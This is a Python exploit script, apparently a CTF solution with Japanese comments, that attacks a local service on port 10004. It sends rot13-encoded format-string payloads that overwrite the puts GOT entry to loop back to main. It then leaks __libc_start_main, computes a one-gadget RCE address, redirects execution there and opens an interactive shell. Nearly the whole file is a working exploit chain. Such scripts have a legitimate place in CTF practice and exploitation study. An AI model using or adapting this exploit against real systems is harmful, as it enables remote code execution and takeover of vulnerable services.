import socket
import time
import os
import struct
import telnetlib
import codecs

def connect(ip, port):
    return socket.create_connection((ip, port))

def p(x):
    return struct.pack('<Q', x)

def u(x):
    return struct.unpack('<Q', x)[0]

def interact(s):
    print('----- interactive code ------')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost',10004))

 # value を 0x601018（GOT の puts）に書き込む書式文字列を作成
# 先頭は'%43$016lx'に固定
def make(value):

    # 書式文字列
    s = '%43$12lx'
    # 出力の長さ
    n = 12

    for i in range(6):
        # 追加で出力する文字数
        t = (value&0xff)-n%256
        if t<=1:
            t += 256
        s += '%{}c%{}$hhn'.format(t, 21+i)
        value >>= 8
        n += t

    s += '\0'*(104-len(s))
    s = bytes(s, 'ascii')
    for i in range(6):
        s += p(0x601018+i)

    # rot13
    s = s.decode('latin-1')
    s = codecs.decode(s, 'rot13')
    s = s.encode('latin-1')
    return s
def make1(value):

    # 書式文字列
    #s = '%43$016lx'
    s = '%43$016lx'
    # 出力の長さ
    n = 16

    for i in range(6):
        # 追加で出力する文字数
        t = (value&0xff)-n%256
        if t<=1:
            t += 256
        s += '%{}c%{}$hhn'.format(t, 23+i)
        value >>= 8
        n += t

    s += '\0'*(120-len(s))
    s = bytes(s, 'ascii')
    for i in range(6):
        s += p(0x601018+i)

    # rot13
    s = s.decode('latin-1')
    s = codecs.decode(s, 'rot13')
    s = s.encode('latin-1')
    return s


def make2(value):

    # 書式文字列
    s = '%43$016lx'
    # 出力の長さ
    n = 16

    for i in range(6):
        # 追加で出力する文字数
        t = (value&0xff)-n%256
        if t<=1:
            t += 256
        s += '%{}c%{}$hhn'.format(t, 24+i)
        value >>= 8
        n += t

    s += '\0'*(127-len(s))
    s = bytes(s, 'ascii')
    for i in range(6):
        s += p(0x601018+i)
    return s
main = 0x4007a2
s.sendall(make(main)+b'\n')
print(make2(main)+b'\n') 
print(make(main)+b'\n') 
time.sleep(1)
d = s.recv(9999)
print(d[1])

start_main = int(d[:16], 16)
print('__libc_start_main:',hex(start_main))
rce = (start_main
    - 0x21b97 # __libc_start_main
    + 0x10a38c) #0x4f322) # One-gadget RCE
s.sendall(make(rce)+b'\n')
#print(make2(rce)+b'\n')
# Telnet が非 ASCII 文字を読み込むと落ちるので、ここで読み飛ばす
time.sleep(1)
s.recv(9999)

#print("Heloo1")
t = telnetlib.Telnet()
t.sock = s

#print("Heloo2")
t.interact()

#print("Heloo")

















